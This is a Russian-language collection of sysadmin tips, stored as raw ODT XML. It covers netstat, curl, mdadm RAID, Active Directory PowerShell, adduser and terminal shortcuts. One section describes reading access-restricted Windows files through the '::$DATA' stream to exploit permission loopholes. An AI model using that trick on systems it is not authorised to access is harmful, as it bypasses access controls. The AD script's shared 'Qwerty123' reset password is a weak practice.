      <text:p text:style-name="P2"><text:span text:style-name="T3">Эта утилита показывает текущее состояние сетевого стека. Она даст вам ответ на вопросы: что у меня там на порту 9081 висит? </text:span><text:span text:style-name="T2">netstat</text:span><text:span text:style-name="T3"> -</text:span><text:span text:style-name="T2">nltp</text:span><text:span text:style-name="T3"> Что с моими </text:span><text:span text:style-name="T2">tcp</text:span><text:span text:style-name="T3"> соединениями и кто прямо сейчас ко мне подключен? </text:span><text:span text:style-name="T2">netstat</text:span><text:span text:style-name="T3"> -</text:span><text:span text:style-name="T2">atp</text:span><text:span text:style-name="T3"> </text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">У этой утилиты есть младший (или старший по возможностям) брат </text:span><text:span text:style-name="T2">ss</text:span><text:span text:style-name="T3"> посмотрите на него тоже может он понравиться больше.</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">curl</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">Утилита для передачи файлов. Так написано в ее описании. Чем же она замечательна? Она умеет кучу протоколов: </text:span><text:span text:style-name="T2">DICT</text:span><text:span text:style-name="T3">, </text:span><text:span text:style-name="T2">FILE</text:span><text:span text:style-name="T3">, </text:span><text:span text:style-name="T2">FTP</text:span><text:span text:style-name="T3">, </text:span><text:span text:style-name="T2">FTPS</text:span><text:span text:style-name="T3">, </text:span><text:span text:style-name="T2">GOPHER</text:span><text:span text:style-name="T3">, </text:span><text:span text:style-name="T2">HTTP</text:span><text:span text:style-name="T3">, </text:span><text:span text:style-name="T2">HTTPS</text:span><text:span text:style-name="T3">, </text:span><text:span text:style-name="T2">IMAP</text:span><text:span text:style-name="T3">, </text:span><text:span text:style-name="T2">IMAPS</text:span><text:span text:style-name="T3">, </text:span><text:span text:style-name="T2">LDAP</text:span><text:span text:style-name="T3">, </text:span><text:span text:style-name="T2">LDAPS</text:span><text:span text:style-name="T3">, </text:span><text:span text:style-name="T2">POP</text:span><text:span text:style-name="T3">3, </text:span><text:span text:style-name="T2">POP</text:span><text:span text:style-name="T3">3</text:span><text:span text:style-name="T2">S</text:span><text:span text:style-name="T3">, </text:span><text:span text:style-name="T2">RTMP</text:span><text:span text:style-name="T3">, </text:span><text:span text:style-name="T2">RTSP</text:span><text:span text:style-name="T3">, </text:span><text:span text:style-name="T2">SCP</text:span><text:span text:style-name="T3">, </text:span><text:span text:style-name="T2">SFTP</text:span><text:span text:style-name="T3">, </text:span><text:span text:style-name="T2">SMB</text:span><text:span text:style-name="T3">, </text:span><text:span text:style-name="T2">SMBS</text:span><text:span text:style-name="T3">, </text:span><text:span text:style-name="T2">SMTP</text:span><text:span text:style-name="T3">, </text:span><text:span text:style-name="T2">SMTPS</text:span><text:span text:style-name="T3">, </text:span><text:span text:style-name="T2">TELNET</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">and</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">TFTP</text:span><text:span text:style-name="T3">. В каждом протоколе она знает множество версий, например </text:span><text:span text:style-name="T2">HTTP</text:span><text:span text:style-name="T3"> она может до версии 2. Умеет подставлять хидера, куки, ходить по </text:span><text:span text:style-name="T2">SSL</text:span><text:span text:style-name="T3">, использовать </text:span><text:span text:style-name="T2">proxy</text:span><text:span text:style-name="T3"> разных видов. Можно отлаживать </text:span><text:span text:style-name="T2">http</text:span><text:span text:style-name="T3">(</text:span><text:span text:style-name="T2">s</text:span><text:span text:style-name="T3">) соединение с помощью -</text:span><text:span text:style-name="T2">v</text:span><text:span text:style-name="T3">. Примеры: </text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">curl</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">http</text:span><text:span text:style-name="T3">://</text:span><text:span text:style-name="T2">artscene</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">textfiles</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">com</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">asciiart</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">unicorn</text:span><text:span text:style-name="T3"> </text:span></text:p>
      <text:p text:style-name="P1">Единорог! </text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">curl</text:span><text:span text:style-name="T3"> -</text:span><text:span text:style-name="T2">v</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">http</text:span><text:span text:style-name="T3">://127.0.0.1:12345 </text:span></text:p>
      <text:p text:style-name="P11"><text:span text:style-name="T3">Соединяемся с сервером из примера </text:span><text:span text:style-name="T2">netcat</text:span><text:span text:style-name="T3">. В консоле сервера увидим </text:span><text:span text:style-name="T2">http</text:span><text:span text:style-name="T3"> запрос. После этого все остановиться </text:span><text:span text:style-name="T2">curl</text:span><text:span text:style-name="T3"> будет ждать ответ. И если вы руками его введете покажет его.</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">Как создать файл произвольного размера в </text:span><text:span text:style-name="T2">Linux</text:span><text:span text:style-name="T3">?</text:span></text:p>
      <text:p text:style-name="P1">Для тестирования скорости приема/передачи данных между двумя серверами необязательно искать большой файл, можно просто создать его в течение пятидесяти секунд.</text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">Чтобы создать файл определенного размера есть несколько способов, использующих разные утилиты. Для примера создадим два тестовых файла размером в 10М</text:span><text:span text:style-name="T2">B</text:span><text:span text:style-name="T3"> с помощью наиболее популярных утилит «</text:span><text:span text:style-name="T2">fallocate</text:span><text:span text:style-name="T3">» и «</text:span><text:span text:style-name="T2">truncate</text:span><text:span text:style-name="T3">».</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">Fallocate</text:span><text:span text:style-name="T3"> используется для манипулирования выделенным дисковым пространством для файла, чтобы освободить или предварительно выделить его. Команда для создания файла будет иметь вид «</text:span><text:span text:style-name="T2">fallocate</text:span><text:span text:style-name="T3"> -</text:span><text:span text:style-name="T2">l</text:span><text:span text:style-name="T3"> 10</text:span><text:span text:style-name="T2">M</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">test</text:span><text:span text:style-name="T3">_</text:span><text:span text:style-name="T2">file</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">txt</text:span><text:span text:style-name="T3">».</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">Truncate</text:span><text:span text:style-name="T3"> используется для уменьшения или расширения размера файла до указанного размера. Чтобы создать файл размером 10</text:span><text:span text:style-name="T2">MB</text:span><text:span text:style-name="T3">, будем использовать </text:span><text:soft-page-break/><text:span text:style-name="T3">команду «</text:span><text:span text:style-name="T2">truncate</text:span><text:span text:style-name="T3"> -</text:span><text:span text:style-name="T2">s</text:span><text:span text:style-name="T3"> 10</text:span><text:span text:style-name="T2">MB</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">test</text:span><text:span text:style-name="T3">_</text:span><text:span text:style-name="T2">file</text:span><text:span text:style-name="T3">_2.</text:span><text:span text:style-name="T2">txt</text:span><text:span text:style-name="T3">». Используйте команду «</text:span><text:span text:style-name="T2">ls</text:span><text:span text:style-name="T3"> -</text:span><text:span text:style-name="T2">l</text:span><text:span text:style-name="T3">», чтобы проверить заданный размер файлов.</text:span></text:p>
      <text:p text:style-name="P1">Размер допустимо задавать обозначениями:</text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3"><text:s/></text:span><text:span text:style-name="T2">• KB • KiB • K</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"> • MB • MiB • M</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s/>• GB • GiB • G</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"> • TB • TiB • T</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"> • PB • PiB • P</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"> • ZB • ZiB • Z</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P11" loext:marker-style-name="T1"><text:span text:style-name="T2"> • YB • YiB • Y</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">Полезные команды Powershell для Active Directory:</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T3">Получить всех пользователей </text:span><text:span text:style-name="T2">AD</text:span><text:span text:style-name="T3"> в домене -- </text:span><text:span text:style-name="T2">Get</text:span><text:span text:style-name="T3">-</text:span><text:span text:style-name="T2">aduser</text:span><text:span text:style-name="T3"> -</text:span><text:span text:style-name="T2">properties</text:span><text:span text:style-name="T3"> * -</text:span><text:span text:style-name="T2">filter</text:span><text:span text:style-name="T3"> *</text:span></text:p>
      <text:p text:style-name="P15">Модуль импорта Active Directory -- Import-module activedirectory</text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">Получить все компьютеры из домена -- </text:span><text:span text:style-name="T2">Get</text:span><text:span text:style-name="T3">-</text:span><text:span text:style-name="T2">adcomputer</text:span><text:span text:style-name="T3"> -</text:span><text:span text:style-name="T2">properties</text:span><text:span text:style-name="T3"> * -</text:span><text:span text:style-name="T2">filter</text:span><text:span text:style-name="T3"> *</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">Отключить пользователя </text:span><text:span text:style-name="T2">AD</text:span><text:span text:style-name="T3"> по имени учетной записи </text:span><text:span text:style-name="T2">SAM</text:span><text:span text:style-name="T3"> -- </text:span><text:span text:style-name="T2">Disable</text:span><text:span text:style-name="T3">-</text:span><text:span text:style-name="T2">ADaccount</text:span><text:span text:style-name="T3"> -</text:span><text:span text:style-name="T2">identity</text:span><text:span text:style-name="T3"> "</text:span><text:span text:style-name="T2">Name</text:span><text:span text:style-name="T3">"</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">Экспорт данных в формат CSV -- Get-adcomputer -properties * -filter * |export-csv "give path"</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">Получить имя учетной записи AD Groups SAM -- Get-ADgroup -identity "provide group name"</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">Выбрать конкретный атрибут пользователя -- </text:span><text:span text:style-name="T2">Get</text:span><text:span text:style-name="T3">-</text:span><text:span text:style-name="T2">aduser</text:span><text:span text:style-name="T3"> -</text:span><text:span text:style-name="T2">properties</text:span><text:span text:style-name="T3"> * -</text:span><text:span text:style-name="T2">filter</text:span><text:span text:style-name="T3"> *</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">Получить информацию о домене -- </text:span><text:span text:style-name="T2">Get</text:span><text:span text:style-name="T3">-</text:span><text:span text:style-name="T2">ADdomain</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">Установите роль Active Directory -- Install-windowsfeature AD-Domain-Services</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P11"><text:span text:style-name="T3">Получить список контроллеров домена -- </text:span><text:span text:style-name="T2">Get</text:span><text:span text:style-name="T3">-</text:span><text:span text:style-name="T2">ADDomainController</text:span></text:p>
      <text:p text:style-name="P1">Полезный софт для самохостинга:</text:p>
      <text:p text:style-name="P1">Home Assistant (https://github.com/home-assistant/core) и Node-RED (https://github.com/node-red/node-red) - управление умным домом.</text:p>
      <text:p text:style-name="P1">Pi-hole (https://github.com/pi-hole/pi-hole) - фильтрация интернет-трафика во всей сети, блокировка рекламы.</text:p>
      <text:p text:style-name="P1">Plex (https://github.com/plexinc/pms-docker) - проприетарный медиасервер для стриминга (в качестве свободной альтернативы можно использовать Jellyfin (https://github.com/jellyfin/jellyfin)).</text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">Transmission (https://github.com/transmission/transmission) - быстрый и простой торрент-клиент, с ним интегрируется менеджер/индексатор Radarr (https://github.com/Radarr/Radarr) или Sonarr (https://github.com/Sonarr/Sonarr) для мониторинга RSS-раздач и автоматического скачивания новых эпизодов. Всё это сразу подгружается в Plex/Jellyfin. Есть ещё менеджер Lidarr (https://github.com/Lidarr/Lidarr) - то же самое, только для музыки, и Prowlarr </text:span><text:soft-page-break/><text:span text:style-name="T3">(https://github.com/Prowlarr/Prowlarr) для интеграции Lidarr, Mylar3, Radarr, Readarr и Sonarr в одном интерфейсе.</text:span></text:p>
      <text:p text:style-name="P1">Audioserve (https://github.com/izderadicka/audioserve), audiobookshelf (https://github.com/advplyr/audiobookshelf) и Boringstreamer (https://github.com/fgergo/boringstreamer) - простые серверы для аудиостриминга, то есть раздачи аудиофайлов из папок (аудиокниги, музыка, подкасты).</text:p>
      <text:p text:style-name="P1">Nextcloud (https://github.com/nextcloud/server) - опенсорсная замена Google Drive и другим облачным хостингам.</text:p>
      <text:p text:style-name="P1">PhotoPrism (https://github.com/photoprism/photoprism) - хранение фотографий, красивый интерфейс для просмотра альбомов и удалённого доступа.</text:p>
      <text:p text:style-name="P1">Invidious (https://github.com/iv-org/invidious) - клиент для YouTube без трекинга и рекламы.</text:p>
      <text:p text:style-name="P1">Nitter (https://github.com/zedeus/nitter) - фронтенд для Twitter (если вы им ещё пользуетесь).</text:p>
      <text:p text:style-name="P1">Whoogle (https://github.com/benbusby/whoogle-search) - фронтенд для Google, очищенный от рекламы, скриптов, ссылок AMP, кукисов и трекинга по IP-адресам с профилированием пользователей, чем занимается Google.</text:p>
      <text:p text:style-name="P13">LibReddit (https://github.com/spikecodes/libreddit) - альтернативный приватный фронтенд для Reddit, тоже без трекинга и рекламы.</text:p>
      <text:p text:style-name="P13">SyncThing (https://github.com/syncthing) - синхронизация файлов между всеми устройствами.</text:p>
      <text:p text:style-name="P1">Code Server (https://github.com/cdr/code-server) - запуск VS Code (https://github.com/Microsoft/vscode) на сервере и удалённый доступ из браузера.</text:p>
      <text:p text:style-name="P1">Vaultwarden (https://github.com/dani-garcia/vaultwarden) - неофициальный сервер для менеджера паролей Bitwarden.</text:p>
      <text:p text:style-name="P1">Tailscale (https://github.com/tailscale/tailscale) - не требующий настройки VPN, который даёт доступ к вашему серверу из любой точки мира.</text:p>
      <text:p text:style-name="P1">Synapse (https://github.com/matrix-org/synapse) - свой инстанс Matrix для децентрализованных чатов, совместимый с клиентами Element (https://github.com/vector-im/element-web).</text:p>
      <text:p text:style-name="P1">Electrs (https://github.com/getumbrel/umbrel-electrs) - быстрый и эффективный сервер для кошелька Electrum.</text:p>
      <text:p text:style-name="P1">Gitea (https://github.com/go-gitea/gitea) - простой хостинг Git.</text:p>
      <text:p text:style-name="P7">Uptime Kuma (https://github.com/louislam/uptime-kuma) - мониторинг аптайма для своего сервера.</text:p>
      <text:p text:style-name="P1">Как прочитать файл с ограниченными правами?</text:p>
      <text:p text:style-name="P1">Грамотное использование особенностей системы и функций наследования прав может существенно затруднить получение доступа к файлам, однако на практике администраторы редко используют имеющийся в их распоряжении арсенал ограничений в полном объеме, вольно или невольно оставляя лазейки в защите.</text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">Если вы не можете прочитать файл напрямую, попробуйте обратиться к его потоку данных. Для этого откройте каталог с файлом, в адресной строке </text:span><text:soft-page-break/><text:span text:style-name="T3">«Проводника» введите команду «cmd» и нажмите «ENTER». Так вы запустите «Командную строку» с привязкой к папке.</text:span></text:p>
      <text:p text:style-name="P1">Если файл предположительно содержит кириллические символы, сначала нужно будет изменить кодировку командой «chcp 1251». Затем выполните «more &lt; name.txt::$DATA &gt; forsave.txt», где «name.txt» - файл, который нужно прочитать, а «forsave.txt» - файл, куда будет сохранен вывод команды. В результате содержимое исходного файла будет сохранено в новом файле.</text:p>
      <text:p text:style-name="P7">Если администратор не халтурил, получить доступ к файлу описанным выше способом не получится, так как при грамотном назначении прав доступа метод обращения к объекту не будет иметь значения. Но так происходит не всегда, поэтому такой подход стоит попробовать.</text:p>
      <text:p text:style-name="P1">Шпаргалка по MDRAID:</text:p>
      <text:p text:style-name="P1">Создание массива:</text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">mdadm --create --verbose /dev/md0 --level=1 <text:s/>--raid-devices=2 /dev/sda1 /dev/sdb1</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1">После чего нужно создать конфигурационный файл mdadm.conf</text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">mdadm --detail --scan &gt; /etc/mdadm/mdadm.conf</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1">И записать изменения в загрузочный образ:</text:p>
      <text:p text:style-name="P1">update-initramfs -u</text:p>
      <text:p text:style-name="P1">Работа с массивом</text:p>
      <text:p text:style-name="P1">Пометка диска как сбойного</text:p>
      <text:p text:style-name="P13">Диск в массиве можно условно сделать сбойным, ключ --fail (-f):</text:p>
      <text:p text:style-name="P15">mdadm /dev/md0 --fail /dev/hde1</text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">mdadm /dev/md0 -f <text:s text:c="4"/>/dev/hde1</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1">Удаление сбойного диска</text:p>
      <text:p text:style-name="P1">Сбойный диск можно удалить с помощью ключа --remove (-r):</text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">mdadm /dev/md0 --remove /dev/hde1</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">mdadm /dev/md0 -r <text:s text:c="6"/>/dev/hde1</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1">Добавление нового диска</text:p>
      <text:p text:style-name="P1">Добавить новый диск в массив можно с помощью ключей --add (-a) и --re-add:</text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">mdadm /dev/md0 --add /dev/hde1</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">mdadm /dev/md0 -a <text:s text:c="3"/>/dev/hde1</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1">Сборка существующего массива</text:p>
      <text:p text:style-name="P1">Собрать существующий массив можно с помощью mdadm --assemble. Как дополнительный аргумент указывается, нужно ли выполнять сканирование устройств, и если нет, то какие устройства нужно собирать.</text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">mdadm --assemble /dev/md0 /dev/hde1 /dev/hdf2 /dev/hdg1</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1">mdadm --assemble --scan</text:p>
      <text:p text:style-name="P1">Проверить состояние массива и получить информацию и массиве</text:p>
      <text:p text:style-name="P1">Состояние массива:</text:p>
      <text:p text:style-name="P1">cat /proc/mdstat</text:p>
      <text:p text:style-name="P1">Информация о массиве:</text:p>
      <text:p text:style-name="P1">mdadm --detail /dev/md0</text:p>
      <text:p text:style-name="P2"><text:soft-page-break/><text:span text:style-name="T3">Информация об элементе массива:</text:span></text:p>
      <text:p text:style-name="P1">mdadm --examine /dev/sda1</text:p>
      <text:p text:style-name="P1">Проверка целостности.</text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">зарускаем</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">проверку</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">echo check &gt; /sys/block/md1/md/sync_action</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">смотрим</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">результат</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">~# cat /proc/mdstat</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s/>Personalities : [raid10] [raid1]</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s/>md0 : active raid1 sdb1[1] sda1[0] sdc1[2] sdd1[3]</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s text:c="7"/>128384 blocks [4/4] [UUUU]</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s/>md1 : active raid10 sdd2[3] sdc2[2] sda2[0] sdb2[1]</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s text:c="7"/>134222848 blocks 256K chunks 2 near-copies [4/4] [UUUU]</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s text:c="7"/>[&gt;....................] <text:s/>check = <text:s/>0.5% (787072/134222848) finish=19.7min speed=112438K/sec</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">Убить</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">массив</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">mdadm --stop /dev/md0</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P11" loext:marker-style-name="T1"><text:span text:style-name="T2">mdadm --zero-superblock /dev/sda..</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="T3">Быстрый совет по </text:span><text:span text:style-name="T2">Linux</text:span><text:span text:style-name="T3">. Используйте эту команду, чтобы получить пароль к подключенной в данный момент сети </text:span><text:span text:style-name="T2">Wi</text:span><text:span text:style-name="T3">-</text:span><text:span text:style-name="T2">Fi</text:span><text:span text:style-name="T3"> '</text:span><text:span text:style-name="T2">nmcli</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">device</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">wifi</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">show</text:span><text:span text:style-name="T3">-</text:span><text:span text:style-name="T2">password</text:span><text:span text:style-name="T3">'.</text:span></text:p>
      <text:p text:style-name="P1">PowerShell скрипт смены пароля в AD у всех пользователей. Меняет всем пароль в AD и ставит галку о смене при первом входе.</text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">Import-Module ActiveDirectory</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P14" loext:marker-style-name="T1"><text:span text:style-name="T2">$users = Get-ADUser -Filter * -SearchBase "OU=</text:span><text:span text:style-name="T3">Пользователи</text:span><text:span text:style-name="T2">,DC=flammlin,DC=local"</text:span></text:p>
      <text:p text:style-name="P14" loext:marker-style-name="T1"><text:span text:style-name="T2">foreach ($user in $users)</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">{</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">$password = ConvertTo-SecureString -String "Qwerty123" -AsPlainText - Force</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">Set-ADAccountPassword -Identity $user -NewPassword $password -Reset -PassThru | Set-ADuser -ChangePasswordAtLogon $True</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P7">}</text:p>
      <text:p text:style-name="P1">adduser - команда, упрощающая создание учетных записей пользователей в основанных на Debian дистрибутивах</text:p>
      <text:p text:style-name="P1">Команда adduser используется в дистрибутиве Debian для упрощения создания учетных записей пользователей, а также автоматической проверки их соотвествия политике упомянутого дистрибутива. Она реализована в виде обертки для таких утилит, как useradd, passwd и chfn и использует дополнительный файл конфигурации /etc/adduser.conf для хранения параметров, относящихся к политике дистрибутива Debian.</text:p>
      <text:p text:style-name="P2"><text:soft-page-break/><text:span text:style-name="T3">Примечание: в дистрибутивах, не имеющих отношения к Debian, команда adduser полностью аналогична команде useradd (если быть точнее, она представлена обычной символьной ссылкой на утилиту useradd).</text:span></text:p>
      <text:p text:style-name="P1">Базовый синтаксис команды adduser:</text:p>
      <text:p text:style-name="P1"># adduser</text:p>
      <text:p text:style-name="P1">В результате исполнения данной команды выполняются следующие операции:</text:p>
      <text:p text:style-name="P1">1- Создается учетная запись пользователя с именем .</text:p>
      <text:p text:style-name="P1">2- Создается домашняя директория пользователя /home/, в которую копируются файлы из директории /etc/skel.</text:p>
      <text:p text:style-name="P1">3- Создается группа пользователей с именем, соотвествующим имени нового пользователя, причем сам этот пользователь добавляется в нее.</text:p>
      <text:p text:style-name="P1">4- Выводится запрос ввода пароля для учетной записи пользователя.</text:p>
      <text:p text:style-name="P1">5- Выводится запрос ввода дополнительной информации, относящейся к учетной записи пользователя.</text:p>
      <text:p text:style-name="P1">Несложно догадаться, что для выполнения практически всех описанных действий может использоваться приведенная ниже последовательность команд на основе более распространенных утилит:</text:p>
      <text:p text:style-name="P1"># useradd -m -U</text:p>
      <text:p text:style-name="P1"># passwd</text:p>
      <text:p text:style-name="P1"># chfn</text:p>
      <text:p text:style-name="P1">Еще одним вариантом использования рассматриваемой команды является добавление существующего пользователя в новую группу пользователей. В этом случае используется следующий синтаксис:</text:p>
      <text:p text:style-name="P1"># adduser</text:p>
      <text:p text:style-name="P1">Данная команда также может быть заменена на более сложную команду на основе более распространенной утилиты usermod:</text:p>
      <text:p text:style-name="P1"># usermod -G , ...,</text:p>
      <text:p text:style-name="P1">Вторая команда является более сложной, но при этом и более гибкой, ведь она позволяет добавить пользователя сразу в несколько новых групп.</text:p>
      <text:p text:style-name="P1">Примеры использования</text:p>
      <text:p text:style-name="P1">Создание учетной записи пользователя iodminbook</text:p>
      <text:p text:style-name="P13"># adduser iodminbook</text:p>
      <text:p text:style-name="P13">Добавление пользователя iodminbook в группу testgroup</text:p>
      <text:p text:style-name="P7"># adduser iodminbook testgroup</text:p>
      <text:p text:style-name="P1">Горячие клавиши терминала Linux</text:p>
      <text:p text:style-name="P1">Общие:</text:p>
      <text:p text:style-name="P1">Ctrl+Alt+T - в дистрибутивах, основанных на Ubuntu это сочетание клавиш используется для открытия терминала.</text:p>
      <text:p text:style-name="P1">Tab - эта клавиша используется для автодополнения в терминале. Вам достаточно набрать начало какой-нибудь команды, затем нажать её, и команда предложит доступные варианты или завершит её если она одна.</text:p>
      <text:p text:style-name="P1">Ctrl+L - очистить весь вывод терминала.</text:p>
      <text:p text:style-name="P1">Ctrl+S - приостановить вывод терминала.</text:p>
      <text:p text:style-name="P2"><text:soft-page-break/><text:span text:style-name="T3">Ctrl+Q - возобновить вывод если он был приостановлен.</text:span></text:p>
      <text:p text:style-name="P1">Ctrl+C - отправить команде сигнал SigInt для её завершения.</text:p>
      <text:p text:style-name="P1">Ctrl+Z - свернуть текущую команду в фоновый режим.</text:p>
      <text:p text:style-name="P1">История команд:</text:p>
      <text:p text:style-name="P1">Стрелки вверх и вниз - используются для перемещения вперед и назад по истории команд.</text:p>
      <text:p text:style-name="P1">Ctrl+r - можно использовать для поиска по истории команд.</text:p>
      <text:p text:style-name="P1">Ctrl+p - предыдущая команда в истории команд.</text:p>
      <text:p text:style-name="P1">Ctrl+n - следующая команда в истории команд.</text:p>
      <text:p text:style-name="P1">Ctrl+g - если вы находитесь в режиме поиска, завершает поиск.</text:p>
      <text:p text:style-name="P1">Ctrl+o - выполнить найденную поиском команду.</text:p>
      <text:p text:style-name="P1">Alt+. - использовать последнее слово предыдущей команды.</text:p>
      <text:p text:style-name="P1">Перемещение курсора:</text:p>
      <text:p text:style-name="P1">Ctrl+a - перейти в начало строки.</text:p>
      <text:p text:style-name="P1">Ctrl+e - перейти в конец строки.</text:p>
      <text:p text:style-name="P1">Alt+b - перейти влево на одно слово.</text:p>
      <text:p text:style-name="P1">Alt+f - перейти в право на одно слово.</text:p>
      <text:p text:style-name="P1">Ctrl+b - перейти влево на один символ.</text:p>
      <text:p text:style-name="P1">Ctrl+f - перейти вправо на один символ.</text:p>
      <text:p text:style-name="P1">Ctrl+xx - перейти в конец или в начало строки.</text:p>
      <text:p text:style-name="P1">Редактирование:</text:p>
      <text:p text:style-name="P1">Ctrl+u - вырезать строку до позиции курсора.</text:p>
      <text:p text:style-name="P1">Alt+Del - удалить слово перед курсором.</text:p>
      <text:p text:style-name="P1">Alt+d - удалить слово после курсора.</text:p>
      <text:p text:style-name="P1">Ctrl+d - удалить символ под курсором.</text:p>
      <text:p text:style-name="P1">Ctrl+h - удалить символ под курсором.</text:p>
      <text:p text:style-name="P1">Ctrl+w - вырезать слово под курсором.</text:p>
      <text:p text:style-name="P1">Ctrl+k - вырезать строку от позиции курсора до конца строки</text:p>
      <text:p text:style-name="P1">Alt+t - поменять текущее слово с предыдущим.</text:p>
      <text:p text:style-name="P1">Ctrl+t - поменять местами два символа перед курсором.</text:p>
      <text:p text:style-name="P1">Esc+t - поменять местами два слова перед курсором.</text:p>
      <text:p text:style-name="P1">Ctrl+y - вставить то, что было вырезано.</text:p>
